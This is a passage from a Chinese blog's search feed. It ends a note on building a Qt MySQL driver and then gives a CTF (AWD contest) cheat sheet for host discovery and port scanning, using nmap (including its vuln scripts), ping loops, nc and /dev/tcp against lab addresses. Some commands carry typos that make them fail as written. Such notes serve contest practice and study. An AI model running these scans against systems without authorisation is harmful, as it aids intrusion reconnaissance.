<p>如果没有报错，就能在你 <code>brew install</code> 安装的 qt 目录下（具体目录也是在 <code>sqldrivers</code> 里）找到 mysql 的驱动啦</p>
<p><img src="/2024/01/20/QT%E9%85%8D%E7%BD%AEMysql%E9%A9%B1%E5%8A%A8/image-3.png"></p>
<p>然后把这个文件复制一份到 Qt-creator 里的 <code>sqldrivers</code> 里，就大功告成</p>
<p><img src="/2024/01/20/QT%E9%85%8D%E7%BD%AEMysql%E9%A9%B1%E5%8A%A8/image-4.png"></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>【AWD】主机发现与端口扫描</title>
    <url>/2024/04/01/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h1 id="【AWD】主机发现与端口扫描"><a href="#【AWD】主机发现与端口扫描" class="headerlink" title="【AWD】主机发现与端口扫描"></a>【AWD】主机发现与端口扫描</h1><h2 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h2><p>比赛时建议扫两次，如果结果相同，则可信。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 扫描 ip 地址(mask为24全扫描)</span></span><br><span class="line">sudo nmap -sn 172.16.200.0/24</span><br><span class="line"><span class="comment"># 端口扫描(指定速率，-p-表示全端口，默认 TCP)</span></span><br><span class="line">sudo nmap --min-rate 10000 -p- 172.16.200.131</span><br><span class="line"><span class="comment"># 强制扫描 UDP</span></span><br><span class="line">sudo nmap -sU --min-rate 10000 -p- 172.16.200.131</span><br><span class="line"><span class="comment"># 服务与环境扫描(-sV打印服务版本，-O打印操作系统信息)</span></span><br><span class="line">sudo nmap -sT -sV -O p-80,111,777,52497,40444 172.16.200.131</span><br><span class="line"><span class="comment"># 使用内置脚本扫描漏洞</span></span><br><span class="line">sudo namp --script=vuln p-80,111,777,52497,40444 172.16.200.131</span><br></pre></td></tr></table></figure>

<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>不能用 kali 和 nmap 的情况下，写BASH脚本，利用 ping 命令发现主机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -c表示数量，-W表示超时时间，指定开放的主机ip范围</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;129..132&#125;;<span class="keyword">do</span> ping -c 1 -W 1 172.16.200.<span class="variable">$i</span>;<span class="keyword">done</span></span><br><span class="line"><span class="comment"># 只打印有效的ip地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..254&#125;;<span class="keyword">do</span> ping -c 1 -W 1 172.16.200.<span class="variable">$i</span>｜grep from;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="netstate-端口扫描"><a href="#netstate-端口扫描" class="headerlink" title="netstate 端口扫描"></a>netstate 端口扫描</h2><p>nc 要使用旧版的才能端口扫描。对于没开放的端口，会有 refused 字段，利用这个过滤，<code>2&gt;&amp;1</code>表示把错误信息导向到普通信息，才能正常过滤。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -vv尽可能详细显示信息，-z指定0数据传输</span></span><br><span class="line">nc.traditional -vv -z 172.16.200.131 1-65535 2&gt;&amp;1 ｜ grep -v refused</span><br></pre></td></tr></table></figure>

<h2 id="伪设备端口扫描"><a href="#伪设备端口扫描" class="headerlink" title="伪设备端口扫描"></a>伪设备端口扫描</h2><p>伪设备的意思是 linux 系统中所有设备被映射成一个文件，所以我们可用文件去模拟设备。</p>
<p><code>&amp;&gt;dev/null</code> 把所有信息都丢掉， <code>&amp;&amp;</code> 表示前面成功执行了(没有报错)，才会执行后面的。就是前面找到了端口，我才会执行后面的语句。<code>|| printf &quot;.&quot;</code> 方便你判断程序是否在运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 括号部分是伪设备</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..65535&#125;;<span class="keyword">do</span> (<span class="built_in">echo</span> &lt; /dev/tcp/172.16.200.131/<span class="variable">$i</span>) &amp;&gt;dev/null &amp;&amp; <span class="built_in">printf</span> <span class="string">&quot;\n[+] The Open Port is: %d\n&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> || <span class="built_in">printf</span> <span class="string">&quot;.&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>AWD</category>
        <category>红队</category>
      </categories>
      <tags>
        <tag>端口扫描</tag>
      </tags>
  </entry>
</search>
